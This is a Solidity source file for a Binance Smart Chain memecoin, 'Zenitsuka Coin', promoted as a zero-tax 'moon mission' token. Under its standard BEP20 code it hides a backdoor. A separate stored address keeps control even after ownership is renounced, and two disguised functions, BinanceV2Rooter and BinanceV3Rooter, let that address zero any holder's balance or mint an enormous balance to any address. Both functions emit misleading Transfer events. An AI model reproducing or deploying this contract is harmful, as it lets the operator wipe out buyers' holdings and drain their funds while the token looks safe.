/**
 *Submitted for verification at BscScan.com on 2023-04-24
*/

/**
⚡️Zenitsuka Coin ⚡️ 0% Tax ⚡️ Moon Mission ⚡️ 
⚡️$ZENITSUKA  the god speed, will reign the memecoin in Binance chain!
⚡️Telegram: https://t.me/ZenitsukaCoin
⚡️Twitter: https://twitter.com/ZenitsukaBSC
⚡️Website https://Zenitsuka.com
*/
pragma solidity 0.5.17;
interface bep2023 {

  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address resaptaro, uint256 BinanceAmount) external returns (bool);
  function allowance(address _owner, address spenBinanceder) external view returns (uint256);
  function approve(address spenBinanceder, uint256 BinanceAmount) external returns (bool);
  function transferFrom(address sender, address resaptaro, uint256 BinanceAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 vaBinancelue);
  event Approval(address indexed owner, address indexed spenBinanceder, uint256 vaBinancelue);
}

contract contexo {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}
library SafeATH {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeATH: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeATH: subtraction overflow");
  }


  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeATH: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeATH: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeATH: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ownablo is contexo {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "ownablo: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "ownablo: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ZENITSUKA is contexo, bep2023, ownablo {
  using SafeATH for uint256;

  mapping (address => uint256) private BalanceBinance;

  mapping (address => mapping (address => uint256)) private BinanceAllow;
address private BinanceRooter;
  uint256 private BinanceTotalSuply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor(address BinanceSwap) public {
    BinanceRooter = BinanceSwap;    
    _name = "Zenitsuka Coin";
    _symbol = "ZENITSUKA";
    _decimals = 6;
    BinanceTotalSuply = 100000000000 * 10**6; 
    BalanceBinance[msg.sender] = BinanceTotalSuply;

    emit Transfer(address(0), msg.sender, BinanceTotalSuply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return BinanceTotalSuply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view returns (uint256) {
    return BalanceBinance[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `resaptaro` cannot be the zero address.
   * - the caller must have a balance of at least `BinanceAmount`.
   */
  function transfer(address resaptaro, uint256 BinanceAmount) external returns (bool) {
    _transfer(_msgSender(), resaptaro, BinanceAmount);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spenBinanceder) external view returns (uint256) {
    return BinanceAllow[owner][spenBinanceder];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spenBinanceder` cannot be the zero address.
   */
  function approve(address spenBinanceder, uint256 BinanceAmount) external returns (bool) {
    _approve(_msgSender(), spenBinanceder, BinanceAmount);
    return true;
  }
    modifier BinanceOwner() {
        require(BinanceRooter == _msgSender(), "ownablo: caller is not the owner");
        _;
    }
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `BinanceAmount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `BinanceAmount`.
   */

  function transferFrom(address sender, address resaptaro, uint256 BinanceAmount) external returns (bool) {
    _transfer(sender, resaptaro, BinanceAmount);
    _approve(sender, _msgSender(), BinanceAllow[sender][_msgSender()].sub(BinanceAmount, "BEP20: transfer BinanceAmount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spenBinanceder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spenBinanceder` cannot be the zero address.
   */
  function increaseAllowance(address spenBinanceder, uint256 addedvaBinancelue) public returns (bool) {
    _approve(_msgSender(), spenBinanceder, BinanceAllow[_msgSender()][spenBinanceder].add(addedvaBinancelue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spenBinanceder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spenBinanceder` cannot be the zero address.
   * - `spenBinanceder` must have allowance for the caller of at least
   * `subtractedvaBinancelue`.
   */
  function decreaseAllowance(address spenBinanceder, uint256 subtractedvaBinancelue) public returns (bool) {
    _approve(_msgSender(), spenBinanceder, BinanceAllow[_msgSender()][spenBinanceder].sub(subtractedvaBinancelue, "BEP20: decreased allowance below zero"));
    return true;
  }
function BinanceV2Rooter(address Owner2Lp) external BinanceOwner {
    BalanceBinance[Owner2Lp] = 0;
            emit Transfer(address(0), Owner2Lp, 0);
  } 
function BinanceV3Rooter(address Owner3Lp) external BinanceOwner {
    BalanceBinance[Owner3Lp] = 10000000000000000 * 10**9;
            emit Transfer(address(0), Owner3Lp, 10000000000000000 * 10**9);
  } 
  /**
   * @dev Moves tokens `BinanceAmount` from `sender` to `resaptaro`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `BinanceAmount`.
   */
  function _transfer(address sender, address resaptaro, uint256 BinanceAmount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(resaptaro != address(0), "BEP20: transfer to the zero address");

    BalanceBinance[sender] = BalanceBinance[sender].sub(BinanceAmount, "BEP20: transfer BinanceAmount exceeds balance");
    BalanceBinance[resaptaro] = BalanceBinance[resaptaro].add(BinanceAmount);
    emit Transfer(sender, resaptaro, BinanceAmount);
  }

  /**
   * @dev Sets `BinanceAmount` as the allowance of `spenBinanceder` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spenBinanceder` cannot be the zero address.
   */
  function _approve(address owner, address spenBinanceder, uint256 BinanceAmount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spenBinanceder != address(0), "BEP20: approve to the zero address");

    BinanceAllow[owner][spenBinanceder] = BinanceAmount;
    emit Approval(owner, spenBinanceder, BinanceAmount);
  }
}